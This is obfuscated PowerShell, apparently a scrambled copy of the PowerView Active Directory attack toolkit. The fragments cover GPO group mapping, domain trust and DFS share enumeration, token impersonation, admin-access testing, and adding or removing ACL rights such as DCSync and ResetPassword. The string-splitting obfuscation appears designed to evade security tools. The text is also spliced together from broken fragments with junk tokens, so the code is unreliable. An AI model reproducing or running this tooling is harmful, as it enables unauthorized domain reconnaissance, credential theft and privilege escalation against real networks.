                                YoV{COnIJKVERIJKTToAIJKRIJKGumeNIJKTS} = @{(Z3b{2}{1}{0}Z3b -f S5zmeS5z,S5zbjectNaS5z,S5zOS5z) = YoV{gIJKROUIJKPNAme}}
                                if (YoV{pSBoUIJKNDIJKpArAmETIJKEIJKRS}[(Z3b{0}{1}Z3b-f S5zDomaiS5z,S5znS5z)]) { YoV{cONVERTIJKToARGUIJKMeNIJKTS}[(Z3b{0}{1}Z3b -fS5zDomaiS5z,S5znS5z)] = YoV{DOIJKMaIn} }
                                YoV{MIJKeMBErsIJKId} = &(Z3b{1}{2}{0}Z3b -f S5zDS5z,S5zConvertS5z,S5zTo-SIS5z) -Domain YoV{dIJKOmaIN} -ObjectName YoV{MIJKeIJKMBeR}

                                if (YoV{MIJKEIJKMbERSId}) {
                                    YoV{gROIJKUpmEIJKmIJKBerS} += YoV{meIJKMIJKBERIJKsID}
                                }
                                else {
                                    YoV{GrIJKoupmeMIJKBeIJKRs} += YoV{meIJKMbEr}
                                }
                            }
                            else {
                                YoV{gRoUPIJKMIJKembIJKerS} += YoV{MIJKEIJKMBer}
                            }
                        }
                    }
                    YoV{_}.Z3bgRoIJKUPmIJKemBErSZ3b = YoV{groupIJKmeMIJKBErs}
                }

                YoV{_} JGO &(Z3b{2}{1}{0}Z3b -f S5z-MemberS5z,S5zddS5z,S5zAS5z) (Z3b{3}{2}{0}{1}Z3b-f S5zrS5z,S5zopertyS5z,S5ztepS5z,S5zNoS5z) (Z3b{3}{0}{2}{1}Z3b -fS5zsplS5z,S5zeS5z,S5zayNamS5z,S5zGPODiS5z) YoV{gIJKPIJKOdiIJKspLaIJKYnAme}
                YoV{_} JGO &(Z3b{1}{3}{2}{0}Z3b-f S5zberS5z,S5zAdS5z,S5zMemS5z,S5zd-S5z) (Z3b{0}{1}{2}Z3b-f S5zNS5z,S5zoteS5z,S5zpropertyS5z) (Z3b{2}{0}{1}Z3b -fS5zNaS5z,S5zmeS5z,S5zGPOS5z) YoV{gIJKPOnIJKAME}
                YoV{_} JGO &(Z3b{0}{2}{1}Z3b -fS5zAS5z,S5zrS5z,S5zdd-MembeS5z) (Z3b{1}{2}{0}Z3b-f S5zpertyS5z,S5zNS5z,S5zoteproS5z) (Z3b{0}{1}Z3b-f S5zGPS5z,S5zOTypeS5z) (Z3b{4}{3}{0}{5}{2}{1}Z3b -fS5zeferS5z,S5zsS5z,S5zceS5z,S5zrS5z,S5zGroupPolicyPS5z,S5zenS5z)
                YoV{_}.Z3bPSOIJKBJIJKeCTZ3b.Z3btYPIJKEnIJKAmeSZ3b.(Z3b{1}{0}{2}Z3b-f S5znS5z,S5zIS5z,S5zsertS5z).Invoke(0, (Z3b{1}{2}{3}{0}Z3b -fS5zpS5z,S5zPoweS5z,S5zrView.GPOGrS5z,S5zouS5z))
                YoV{_}
            }
        }
    }
}


function Get-dIJKOMaIJKinGpoIJKUIJKsERIJKlocalGROIJKUIJKpMaIJKPpIng {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{1}{0}Z3b -f S5zhouldProcessS5z,S5zSSS5z,S5zPS5z}, S5zS5z)]
    [OutputType({Z3b{0}{2}{7}{6}{3}{4}{1}{5}Z3b-f S5zPowerViS5z,S5zppS5z,S5zew.GS5z,S5zalGroupS5z,S5zMaS5z,S5zingS5z,S5zUserLocS5z,S5zPOS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTion = 0, ValueFroMpiPEliNe = YoV{tIJKRUe}, vALUEFRoMPipELINEBypRoPErTYNAME = YoV{tRIJKUe})]
        [Alias({Z3b{2}{3}{5}{4}{1}{0}Z3b-f S5zdNameS5z,S5znguisheS5z,S5zDS5z,S5zisS5z,S5ziS5z,S5ztS5z}, {Z3b{0}{3}{2}{1}Z3b -fS5zSS5z,S5zNameS5z,S5zccountS5z,S5zamAS5z}, {Z3b{0}{1}Z3b-f S5zNS5z,S5zameS5z})]
        [String]
        YoV{iIJKdeNIJKTiIJKTy},

        [String]
        [ValidateSet({Z3b{0}{2}{1}{3}Z3b-fS5zAdmS5z,S5ziS5z,S5zinS5z,S5zstratorsS5z}, {Z3b{1}{2}{3}{0}Z3b-f S5z544S5z,S5zS-S5z,S5z1-5S5z,S5z-32-S5z}, S5zRDPS5z, {Z3b{4}{0}{5}{3}{1}{2}Z3b-fS5zote S5z,S5zUserS5z,S5zsS5z,S5zop S5z,S5zRemS5z,S5zDesktS5z}, {Z3b{0}{3}{2}{1}Z3b-fS5zS-1-S5z,S5z5S5z,S5z-32-55S5z,S5z5S5z})]
        YoV{loIJKCaLgrOIJKUp} = (Z3b{2}{0}{1}{3}Z3b-fS5zminS5z,S5zisS5z,S5zAdS5z,S5ztratorsS5z),

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dOmIJKAIJKIn},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b -f S5zADSPaS5z,S5zthS5z})]
        [String]
        YoV{seaIJKRcHbIJKAse},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}{3}Z3b -f S5zeS5z,S5zDoS5z,S5zmainControllS5z,S5zrS5z})]
        [String]
        YoV{SerVIJKeR},

        [ValidateSet({Z3b{0}{1}Z3b -f ','ntityS5z)] = YoV{coIJKmpuTIJKeRsIte}
                        YoV{GPoaIJKdSPatIJKhs} += &(Z3b{3}{1}{2}{0}Z3b-fS5zSiteS5z,S5z-DomaiS5z,S5znS5z,S5zGetS5z) @SearcherArguments JGO &(Z3b{4}{1}{0}{2}{3}Z3b -f S5z','[Reflection.Emit.ModuleBuilder]) -or (YoV{_} -is [Reflection.Assembly])})]
        YoV{mODuIJKle},

        [ValidateNotNull()]
        [String]
        YoV{nAIJKMIJKesPIJKAce} = S5zS5z
    )

    BEGIN
    {
        YoV{TYPIJKeHaIJKsh} = @{}
    }

    PROCESS
    {
        if (YoV{MOdUIJKLe} -is [Reflection.Assembly])
        {
            if (YoV{nAmeSIJKpIJKAce})
            {
                YoV{TyIJKPehIJKAsH}[YoV{dllIJKNIJKAme}] = YoV{ModIJKUIJKLE}.(Z3b{1}{0}Z3b-f S5ztTypeS5z,S5zGeS5z).Invoke(Z3bYoVNamespace.YoVDllNameZ3b)
            }
            else
            {
                YoV{TyIJKpEHIJKASH}[YoV{dLIJKlIJKNaME}] = YoV{mIJKOdULe}.(Z3b{0}','V{SIJKCriIJKpTParAIJKMS} = @{
                (Z3b{2}{0}{1}Z3b -fS5zoupNaS5z,S5zmeS5z,S5zGrS5z) = YoV{gIJKROuIJKpnIJKAMe}
                (Z3b{2}{0}{1}Z3b-fS5zhoS5z,S5zdS5z,S5zMetS5z) = YoV{mIJKetIJKhod}
                (Z3b{3}{1}{2}{0}Z3b -f S5zleS5z,S5zenHaS5z,S5zndS5z,S5zTokS5z) = YoV{lOIJKgIJKonToIJKken}
            }

            
            &(Z3b{1}{2}{3}{0}Z3b -fS5znS5z,S5zNewS5z,S5z-ThreS5z,S5zadedFunctioS5z) -ComputerName YoV{TAIJKRgEtcIJKoMIJKpIJKUtIJKERs} -ScriptBlock YoV{HIJKoIJKsIJKTenUmblOck} -ScriptParameters YoV{SCIJKRIIJKptPIJKARAIJKmS} -Threads YoV{ThrIJKEAdS}
        }
    }

    END {
        if (YoV{loIJKgOnIJKTIJKOken}) {
            &(Z3b{5}{2}{3}{4}{1}{0}Z3b-fS5zlfS5z,S5zSeS5z,S5znvoke-ReverS5z,S5ztTS5z,S5zoS5z,S5zIS5z) -TokenHandle YoV{LogIJKoIJKNtOIJKkeN}
        }
    }
}








function get-DoIJKMaIJKINIJKTrIJKUsT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{0}{3}{2}{4}Z3b-f S5zhoS5z,S5zPSSS5z,S5zsS5z,S5zuldProceS5z,S5zsS5z}, S5zS5z)]
    [OutputType({Z3b{6}{5}{3}{1}{4}{7}{0}{2}Z3b-f S5zt.NS5z,S5zew.S5z,S5zETS5z,S5ziS5z,S5zDomainTruS5z,S5zowerVS5z,S5zPS5z,S5zsS5z})]
    [OutputType({Z3b{4}{3}{0}{2}{1}{5}Z3b-f S5zw.DomS5z,S5zrusS5z,S5zainTS5z,S5zeS5z,S5zPowerViS5z,S5zt.LDAPS5z})]
    [OutputType({Z3b{0}{1}{5}{3}{4}{2}Z3b -fS5zPowerS5z,S5zVS5z,S5zTrust.APIS5z,S5zDS5z,S5zomainS5z,S5ziew.S5z})]
    [CmdletBinding(dEFaULTpar','1}{0}Z3b -fS5zllS5z,S5zFindAS5z).Invoke()
                    YoV{RIJKEsUlIJKTS} JGO &(Z3b{3}{1}{2}{0}Z3b -f S5zctS5z,S5zeS5z,S5zre-ObjeS5z,S5zWhS5z) {YoV{_}} JGO &(Z3b{0}{1}{3}{2}Z3b-fS5zFS5z,S5zorS5z,S5zach-ObjectS5z,S5zES5z) {
                        YoV{pROPerTIJKIIJKes} = YoV{_}.Z3bpROIJKPIJKeRtIEsZ3b
                        YoV{ReIJKMOTenAIJKMES} = YoV{pROIJKPerIJKTIIJKeS}.Z3bREmIJKoTEsErIJKVIJKeIJKRnAmeZ3b
                        YoV{pIJKKT} = YoV{pIJKROperIJKTIIJKeS}.Z3bpIJKKtZ3b

                        YoV{dFSIJKSIJKHIJKARes} += YoV{rEmOIJKTENAIJKmIJKes} JGO &(Z3b{1}{0}{3}{2}Z3b -fS5zorEachS5z,S5zFS5z,S5zObjectS5z,S5z-S5z) {
                            try {
                                if ( YoV{_}.(Z3b{0}{','YoV{AcIJKeS} = @()

            if (YoV{RIIJKGhtSGuIJKid}) {
                YoV{gIJKUids} = @(YoV{RiGhIJKTsIJKgIJKUID})
            }
            else {
                YoV{guIIJKDS} = Switch (YoV{RIJKiGhIJKTs}) {
                    
                    (Z3b{0}{3}{1}{2}Z3b-f S5zResS5z,S5ztPasS5z,S5zswordS5z,S5zeS5z) { (Z3b{0}{5}{2}{8}{9}{7}{1}{3}{6}{4}Z3b -f S5z00S5z,S5z00aa0S5z,S5z-246d-11S5z,S5z06S5z,S5z0529S5z,S5z299570S5z,S5zeS5z,S5z8-S5z,S5zd0-a7S5z,S5z6S5z) }
                    
                    (Z3b{1}{2}{3}{0}Z3b-fS5zersS5z,S5zWS5z,S5zriteMemS5z,S5zbS5z) { (Z3b{8}{6}{3}{1}{7}{5}{2}{4}{9}{0}{10}Z3b-f S5z4S5z,S5zc0-0dS5z,S5zaS5z,S5z679S5z,S5z28S5z,S5z11d0-S5z,S5z9S5z,S5ze6-S5z,S5zbfS5z,S5z5-00aa0030S5z,S5z9e2S5z) }
                    
                    
                    
                    
                    (Z3b{1}{0}Z3b -f S5zncS5z,S5zDCSyS5z) { (Z3b{5}{4}{1}{6}{3}{2}{0}Z3b-fS5zcd2S5z,S5z-f7S5z,S5z00c04fc2dS5z,S5z-S5z,S5zf6aa-9c07-11d1S5z,S5z1131S5z,S5z9fS5z), (Z3b{4}{10}{7}{3}{6}{0}{1}{9}{2}{8}{5}Z3b -fS5zd1S5z,S5z-fS5z,S5z-00cS5z,S5z-S5z,S5z1131f6S5z,S5zcd2S5z,S5z11S5z,S5zc07S5z,S5z04fc2dS5z,S5z79fS5z,S5zad-9S5z), (Z3b{3}{5}{0}{4}{1}{6}{2}Z3b-f S5z44d-4cS5z,S5za-0facS5z,S5zcS5z,S5z89S5z,S5z62-991S5z,S5ze95b76-4S5z,S5zbeda640S5z)}
                }
            }

            ForEach (YoV{PriNIJKCIJKiPIJKAIJKlObjEct} in YoV{PrIIJKNIJKcIpIJKAlS}) {
                &(Z3b{2}{0}{3}{1}Z3b -f S5zteS5z,S5zeS5z,S5zWriS5z,S5z-VerbosS5z) Z3b[Remove-DomainObjectAcl] Removing principal YoV(YoVPrincipalObject.distinguishedname) S5zYoVRightsS5z from YoV(YoVTargetObject.Properties.distinguishedname) Z3b

                try {
                    YoV{iIJKdEntIIJKTy} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]YoV{PIJKRIJKiNCipalIJKOIJKBJECt}.Z3bOBIJKJeCIJKTSidZ3b)

                    if (YoV{GUIIJKDs}) {
                        ForEach (YoV{GUIJKID} in YoV{gUIIJKDS}) {
                            YoV{NEWgIJKUId} = &(Z3b{2}{0}{1}Z3b-fS5zew-ObjS5z,S5zectS5z,S5zNS5z) (Z3b{1}{0}Z3b-fS5zidS5z,S5zGuS5z) YoV{GUIJKId}
                            YoV{AIJKDRiGIJKhts} = [System.DirectoryServices.ActiveDirectoryRights] (Z3b{0}{2}{1}Z3b-fS5zExtenS5z,S5zghtS5z,S5zdedRiS5z)
                            YoV{AIJKCEs} += &(Z3b{1}{0}{3}{2}Z3b-fS5zbS5z,S5zNew-OS5z,S5ztS5z,S5zjecS5z) (Z3b{11}{12}{5}{1}{10}{2}{7}{9}{6}{3}{13}{14}{4}{8}{0}Z3b-f S5zsRuleS5z,S5zrS5z,S5zrS5z,S5zAS5z,S5zoryAccS5z,S5ztoS5z,S5z.S5z,S5zviS5z,S5zesS5z,S5zcesS5z,S5zySeS5z,S5zSysS5z,S5ztem.DirecS5z,S5zctiveS5z,S5zDirectS5z) YoV{iIJKDEIJKNTity}, YoV{aIJKDrigHIJKTs}, YoV{contIJKROIJKLTyIJKPe}, YoV{NIJKEWguIJKId}, YoV{iNhERItaIJKNceIJKTIJKYpe}
                        }
                    }
                    else {
                        
                        YoV{adIJKRiIJKGHts} = [System.DirectoryServices.ActiveDirectoryRights] (Z3b{1}{0}{2}Z3b-fS5zicS5z,S5zGenerS5z,S5zAllS5z)
                        YoV{AIJKCeS} += &(Z3b{1}{0}{2}{3}Z3b -f S5zew-S5z,S5zNS5z,S5zObjecS5z,S5ztS5z) (Z3b{6}{7}{5}{1}{3}{8}{10}{12}{4}{9}{0}{11}{2}Z3b-f S5zcS5z,S5ztoS5z,S5zssRuleS5z,S5zryServiS5z,S5ztS5z,S5zecS5z,S5zSS5z,S5zystem.DirS5z,S5zces.ActS5z,S5zoryAS5z,S5ziveS5z,S5zceS5z,S5zDirecS5z) YoV{idENtIJKIIJKTY}, YoV{adIJKRiGIJKHTS}, YoV{ContrIJKOIJKltypE}, YoV{INIJKhIJKeIJKRITaNcETIJKypE}
                    }

                    
                    ForEach (YoV{aIJKce} in YoV{aIJKCES}) {
                        &(Z3b{1}{0}{2}Z3b-fS5z-VS5z,S5zWriteS5z,S5zerboseS5z) Z3b[Remove-DomainObjectAcl] Granting principal YoV(YoVPrincipalObject.distinguishedname) rights GUID S5zYoV(YoVACE.ObjectType)S5z on YoV(YoVTargetObject.Properties.distinguishedname) Z3b
                        YoV{TARIJKGEIJKTeIJKNTRY} = YoV{tIJKAIJKRgIJKEToBjeCt}.(Z3b{5}{1}{3}{4}{0}{2}Z3b-fS5zorS5z,S5zeS5z,S5zyEntryS5z,S5ztDS5z,S5zirectS5z,S5zGS5z).Invoke()
                        YoV{taIJKRGETIJKENtIJKRY}.Z3bPIJKsbIJKASEZ3b.Z3bopTiOIJKNsZ3b.Z3bSECuRitIJKymAsIJKKSZ3b = (Z3b{1}{0}Z3b-f S5zclS5z,S5zDaS5z)
                        YoV{tARIJKGeTeIJKNTIJKRy}.Z3bPsIJKBaIJKSEZ3b.Z3bOIJKBIJKjEctsEcuIJKRitYZ3b.(Z3b{4}{2}{1}{3}{0}Z3b -fS5zeS5z,S5zessS5z,S5zemoveAccS5z,S5zRulS5z,S5zRS5z).Invoke(YoV{aIJKCE})
                        YoV{TIJKAIJKRgIJKETEnTRy}.Z3bpSBAIJKseZ3b.(Z3b{2}{0}{1}{3}Z3b -fS5zmmS5z,S5zitChanS5z,S5zCoS5z,S5zgesS5z).Invoke()
                    }
                }
                catch {
                    &(Z3b{2}{1}{0}Z3b-fS5zoseS5z,S5zrbS5z,S5zWrite-VeS5z) Z3b[Remove-DomainObjectAcl] Error removing principal YoV(YoVPrincipalObject.distinguishedname) S5zYoVRightsS5z from YoV(YoVTargetObject.Properties.distinguishedname) : YoV_ Z3b
                }
            }
        }
    }
}


function fINDIJK-iNTErIJKEIJKSIJKTIIJKNgIJKDIJKOmaINAcL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{0}{1}{2}Z3b -fS5zSSS5z,S5','NTRuIJKSTarGUMEIJKNTS}[S5zAPIS5z] = YoV{AIJKpI} }
    if (YoV{psboIJKUIJKNdPARAIJKMEIJKTEIJKRS}[S5zNETS5z]) { YoV{DoMAIIJKNIJKTRUSTaIJKRGUMEIJKNIJKTs}[S5zNETS5z] = YoV{NIJKet} }
    if (YoV{PIJKSBOUNIJKDPIJKARAMetEIJKRS}[(Z3b{2}{0}{1}Z3b -f S5zPFS5z,S5zilterS5z,S5zLDAS5z)]) { YoV{DomIJKAiNIJKTIJKRIJKUSTAIJKRgUMEntS}[(Z3b{2}{0}{1}Z3b -f S5ziS5z,S5zlterS5z,S5zLDAPFS5z)] = YoV{ldAIJKpIJKFiLIJKTer} }
    if (YoV{pIJKsbouNdPIJKAraIJKmETIJKErS}[(Z3b{1}{0}{2}Z3b-f S5zopertiS5z,S5zPrS5z,S5zesS5z)]) { YoV{domAInTrUIJKStaRIJKGIJKUmEIJKNTs}[(Z3b{1}{2}{0}Z3b -f S5zesS5z,S5zPropertS5z,S5ziS5z)] = YoV{PropEIJKRTIJKIEs} }
    if (YoV{PsbOIJKUNdpARIJKAMeIJKTeIJKRs}[(Z3b{1}{0}{2}Z3b-fS5zrS5z,S5zSeaS5z,S5zchBaseS5z)]) { YoV{DoMAInTRUStIJKARIJKgIJKUIJKmIJKENtS}[(Z3b{1}{2}{0}Z3b-fS5zhBaseS5z,S5zSeS5z,S5zarcS5z)] = YoV{SEArchIJKBaIJKSE} }
    if (YoV{pSBoIJKUnDPAIJKRaIJKmeIJKTERs}[(Z3b{1}{2}{0}Z3b -f S5zerS','5z}, S5zS5z)]
    [OutputType({Z3b{2}{1}{3}{0}{4}Z3b-f S5zdFiS5z,S5zeS5z,S5zPowerViS5z,S5zw.FounS5z,S5zleS5z})]
    [CmdletBinding(defaUlTPARAmETeRSEtnAme = {Z3b{4}{0}{3}{1}{2}Z3b -fS5zleSS5z,S5zcatioS5z,S5znS5z,S5zpecifiS5z,S5zFiS5z})]
    Param(
        [Parameter(PosItIon = 0, VALUeFromPIPElINE = YoV{TrIJKUe}, VAlUefroMPiPelineBYprOPeRtynaME = YoV{TrIJKUe})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{paIJKTh} = S5z.5rjS5z,

        [Parameter(paRAMeTeRsETnAmE = Z3bfIJKiIJKLEsIJKPEcIJKiFicATIoNZ3b)]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}{3}Z3b-fS5zermS5','         
                            
                            if (YoV{_} -ne (Z3b{1}{0}Z3b -f S5zullS5z,S5znS5z)) {
                                &(Z3b{0}{2}{1}Z3b -fS5zNew-ObjeS5z,S5ztS5z,S5zcS5z) -TypeName (Z3b{1}{0}{2}Z3b-fS5zObS5z,S5zPSS5z,S5zjectS5z) -Property @{(Z3b{0}{1}Z3b-f S5zNaS5z,S5zmeS5z)=YoV{proIJKPeIJKRTIJKIeS}.Z3bnIJKAmeZ3b[0];(Z3b{2}{3}{4}{0}{1}Z3b-f S5zrNS5z,S5zameS5z,S5zRS5z,S5zemotS5z,S5zeServeS5z)=YoV{_}}
                            }
                        }
                    }
                }
                catch {
                    &(Z3b{2}{1}{0}Z3b-f S5zgS5z,S5zarninS5z,S5zWrite-WS5z) (S5z[GeS5z+S5zt-DomainDFS5z+S5zSSharS5z+S5ze] S5z+S5zGet-DomainDFSS5z+S5zSharS5z+S5zeS5z+S5zVS5z+S5z1 S5z+S5zerS5z+S5zror S5z+S5z: S5z+Z3bYoV_Z3b)
                }
                YoV{dIJKFSSHIJKAIJKRes} JGO &(Z3b{0}{1}{2}Z3b -f S5zSorS5z,S5zt-ObjecS5z,S5ztS5z) -Unique -Property (Z3b{3}{0}{2}{4}{1}Z3b -f S5zServerS5z,S5zeS5z,S5zNS5z,S5zRemoteS5z,S5zamS5z)
            }
        }

        function GIJKeT-dIJKomAIIJKNIJKdFssHAIJKRIJKEV2 {
            [CmdletBinding()]
            Param(
                [String]
                YoV{DOIJKMIJKAin},

                [String]
                YoV{sEIJKAIJKRchbaIJKSE},

                [String]
                YoV{SeIJKRVEr},

                [String]
                YoV{seIJKArcHSCoIJKpE} = (Z3b{0}{1}{2}Z3b -f S5zSS5z,S5zuS5z,S5zbtreeS5z),

                [Int]
                YoV{REIJKSUlTPAGeSIJKIze} = 200,

                [Int]
                YoV{sERIJKVERtiMeIJKLIIJKMIT},

                [Switch]
                YoV{TOmIJKBIJKsToNe},

                [Management.Automation.PSCredential]
                [Management.Automation.Cred','z) {
                            if (YoV{_}.Z3bsIJKIdZ3b -notmatch (Z3b{2}{0}{1}Z3b -fS5z-1-5-2S5z,S5z1S5z,S5zSS5z)) {
                                YoV{_} JGO &(Z3b{2}{0}{1}Z3b -fS5zembS5z,S5zerS5z,S5zAdd-MS5z) (Z3b{1}{2}{0}Z3b -fS5zrtyS5z,S5zNoteprS5z,S5zopeS5z) (Z3b{2}{1}{0}Z3b -fS5zainS5z,S5zmS5z,S5zIsDoS5z) YoV{fAIJKlse}
                            }
                            else {
                                YoV{_} JGO &(Z3b{0}{1}{2}Z3b -fS5zAdd-MeS5z,S5zmbS5z,S5zerS5z) (Z3b{1}{2}{0}Z3b -fS5zropertyS5z,S5zNotS5z,S5zepS5z) (Z3b{0}{1}{2}Z3b-fS5zIsDomS5z,S5zaiS5z,S5znS5z) (Z3b{1}{0}Z3b-fS5zOWNS5z,S5zUNKNS5z)
                            }
                        }
                    }
                    YoV{MeMbIJKeRS}
                }
                else {
                    &(Z3b{0}{1}{2}Z3b -fS5zWrite-S5z,S5zVS5z,S5zerboseS5z) Z3b[Get-NetLocalGroupMember] Error: YoV(([ComponentModel.Win32Exception] YoVResult).Message) Z3b
                }
            }
            else {
                
                try {
                    YoV{gRIJKOUPpRoVIJKiIJKDIJKER} = [ADSI]Z3bWinNT://YoVComputer/YoVGroupName,groupZ3b

                    YoV{groupIJKPROvIJKidIJKer}.Z3bpSbIJKASeZ3b.Z3biNIJKVoIJKkEZ3b((Z3b{0}{1}{2}Z3b-fS5zMeS5z,S5zmS5z,S5zbersS5z)) JGO &(Z3b{3}{0}{2}{1}Z3b -fS5zEach-OS5z,S5zctS5z,S5zbjeS5z,S5zForS5z) {

                        YoV{MIJKEIJKMBer} = &(Z3b{1}{3}{2}{0}Z3b -f S5zctS5z,S5zNS5z,S5zw-ObjeS5z,S5zeS5z) (Z3b{0}{1}{2}Z3b -fS5zPS5z,S5zSOS5z,S5zbjectS5z)
                        YoV{meMIJKBER} JGO &(Z3b{1}{2}{0}Z3b -f S5zerS5z,S5zAddS5z,S5z-MembS5z) (Z3b{2}{0}{1}Z3b-f S5zotepS5z,S5zropertyS5z,S5zNS5z) (Z3b{3}{0}{1}{2}Z3b -f S5zomS5z,S5zputerNaS5z,S5zmeS5z,S5zCS5z) YoV{CIJKompUIJKTer}
                        YoV{mEmIJKBIJKer} JGO &(Z3b{0}{1}{2}Z3b-f S5zAdd-S5z,S5zMeS5z,S5zmberS5z) (Z3b{0}{2}{1}Z3b -f S5zNoS5z,S5zpropertyS5z,S5zteS5z) (Z3b{0}{1}Z3b -fS5zGroS5z,S5zupNameS5z) YoV{GRIJKouIJKPnaME}

                        YoV{lIJKoIJKCalUSER} = ([ADSI]YoV{_})
                        YoV{adsIJKPAIJKTH} = YoV{loIJKCAlUIJKSER}.(Z3b{0}{1}{2}Z3b-f S5zInS5z,S5zvokS5z,S5zeGetS5z).Invoke((Z3b{1}{0}Z3b -fS5zdsPathS5z,S5zAS5z)).(Z3b{1}{0}Z3b -f S5zeplaceS5z,S5zRS5z).Invoke((Z3b{1}{0}Z3b-f S5z/S5z,S5zWinNT:/S5z), S5zS5z)
                        YoV{ISIJKGRIJKOup} = (YoV{LocaIJKlUsIJKer}.Z3bSIJKCHIJKemAClIJKAsSNIJKAmEZ3b -like (Z3b{1}{0}Z3b -f S5zpS5z,S5zgrouS5z))

                        if(( (  &(Z3b{0}{1}{2}Z3b-f S5zvarIS5z,S5zABS5z,S5zLES5z) 3O7l  ).Z3bVaIJKLUeZ3b::(Z3b{0}{1}{2}Z3b -fS5zMatS5z,S5zchS5z,S5zesS5z).Invoke(YoV{ADIJKsPIJKATH}, S5z/S5z)).Z3bcouIJKNtZ3b -eq 1) ','3b{5}{8}{6}{2}{11}{12}{0}{4}{3}{10}{13}{9}{7}{1}Z3b-f S5zhareFilS5z,S5zerateS5z,S5zerestinS5z,S5zsS5z,S5ze] No hostS5z,S5z[FS5z,S5z-IntS5z,S5z enumS5z,S5zindS5z,S5ztoS5z,S5z founS5z,S5zgDomainS5z,S5zSS5z,S5zd S5z)
        }

        
        YoV{hOstenIJKUIJKmBLIJKoCK} = {
            Param(YoV{coIJKMIJKPuTErIJKNAmE}, YoV{INIJKCluIJKDe}, YoV{excLUIJKdEDshIJKAREs}, YoV{offIIJKceIJKDIJKOCS}, YoV{ExcLuIJKDeIJKHIDIJKden}, YoV{FREIJKSIJKhEXeS}, YoV{cHIJKEIJKcKWRIJKitEacCIJKeSS}, YoV{toIJKkeNIJKHAIJKNdLe})

            if (YoV{TIJKoIJKKENHANDIJKlE}) {
                
                YoV{nIJKULl} = &(Z3b{5}{0}{3}{2}{4}{1}Z3b-fS5zoS5z,S5znS5z,S5zImpersoS5z,S5zke-UserS5z,S5znatioS5z,S5zInvS5z) -TokenHandle YoV{ToIJKKenhIJKANDLe} -Quiet
            }

            ForEach (YoV{taIJKRgIJKETCOMpuTIJKER} in YoV{cOmPuIJKTERIJKNAMe}) {

                YoV{sEArIJKCIJKhIJKshArIJKEs} = @()
                if (YoV{tAIJKRgIJKeTcOIJKmpUTIJKER}.(Z3b{0}{2}','+S5zserverS5z+S5z S5z+S5zfor:S5z+S5z S5z+Z3bYoVComputerNameZ3b)
            }
        }
    }

    END {
        if (YoV{LIJKoIJKgoNTOkEN}) {
            &(Z3b{3}{2}{1}{4}{5}{0}Z3b -f S5zlfS5z,S5zkeS5z,S5zvoS5z,S5zInS5z,S5z-RevertS5z,S5zToSeS5z) -TokenHandle YoV{LIJKogIJKOnTOkIJKeN}
        }
    }
}


function TeSIJKT-AdMiNacceIJKSS {


    [OutputType({Z3b{0}{1}{3}{2}Z3b -fS5zPowerS5z,S5zVieS5z,S5znAccessS5z,S5zw.AdmiS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(poSItION = 0, vAluefroMPIpElinE = YoV{tRIJKUE}, VAluEFROmPipeLINebyPrOpErTyName = YoV{TIJKRUe})]
        [Alias({Z3b{1}{0}Z3b -f S5zstNameS5z,S5zHoS5z}, {Z3b{2}{1}{0}Z3b -f S5zmeS5z,S5zostnaS5z,S5zdnshS5z}, {Z3b{0}{1}Z3b-fS5znamS5z,S5zeS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{CoMPIJKUTeIJKRNIJKAME} = (Z3b{1}{2}{','
                YoV{BIJKLoIJKB_NAmeIJK_EnD} = YoV{blIJKOb_nIJKAMe_IJKstARt} + YoV{blOIJKB_NIJKAmEIJK_sizE} - 1
                YoV{BlIJKOIJKB_nIJKAME} =   (  &(Z3b{0}{1}Z3b -fS5zgS5z,S5zcIS5z)  VaRIabLE:6O2zLP  ).Z3bvaIJKlueZ3b::Z3bUnIIJKCOdEZ3b.Z3bgeTIJKSIJKTRiNGZ3b(YoV{BIJKiN}[YoV{blIJKoIJKB_nAME_sTaRt}..YoV{bLIJKoB_IJKNIJKAmE_IJKEnd}])

                YoV{bLOB_IJKdIJKATA_IJKsIJKiZIJKE_STarT} = YoV{bIJKLoB_IJKNIJKAme_EIJKND} + 1
                YoV{bIJKLIJKoIJKB_IJKdIJKAtA_SIZE_ENd} = YoV{bIJKLIJKOb_dIJKAtA_IJKSiZE_IJKStART} + 3
                YoV{bLIJKoIJKB_dATA_sIJKIzE} =   ( &(Z3b{1}{0}Z3b-f S5zIRS5z,S5zdS5z)  vArIable:Aepsi).Z3bVaIJKlueZ3b::Z3btIJKoUiIJKNT32Z3b(YoV{bIJKin}[YoV{bIJKloB_dIJKAtA_sIzEIJK_StARt}..YoV{blIJKOb_DAtIJKA_sIzIJKEIJK_IJKEIJKND}],0)

                YoV{blIJKobIJK_DATa_IJKSTarT} = YoV{BIJKlIJKOBIJK_DAtA_IJKSIZe_END} + 1
                YoV{BLIJKoB_IJKdaIJKTa_EnD} = YoV{bLob_dIJKATIJKAIJK_staIJKRt} + YoV{blOBIJK_dIJKATA_SiIJKze} - 1
                YoV{BIJKLOBIJK_IJKdaTA} = YoV{BIJKiN}[YoV{bLOb_daIJKTAIJK_start}..YoV{BLIJKoB_dIJKAIJKTIJKA_enD}]
                switch -wildcard (YoV{bIJKLIJKOb_nAME}) {
                    (((Z3b{1}{2}{0}Z3b -fS5zterootS5z,S5z4S5z,S5zPgsiS5z)).(Z3b{1}{2}{0}Z3b -fS5zES5z,S5zrEpS5z,S5zLACS5z).Invoke(S5z4PgS5z,S5z5rjS5z)) {  }
                    (((Z3b{3}{1}{2}{0}Z3b -f S5zoot*S5z,S5zainS5z,S5zrS5z,S5z0HgdomS5z)) -cREplaCE  S5z0HgS5z,[ChAR]92) {
                        
                        
                        YoV{roIJKOt_OrIJK_LInk_IJKgIJKUIIJKD_IJKSIJKTart} = 0
                        YoV{roOT_OR_LIJKinKIJK_guiIJKD_eIJKNd} = 15
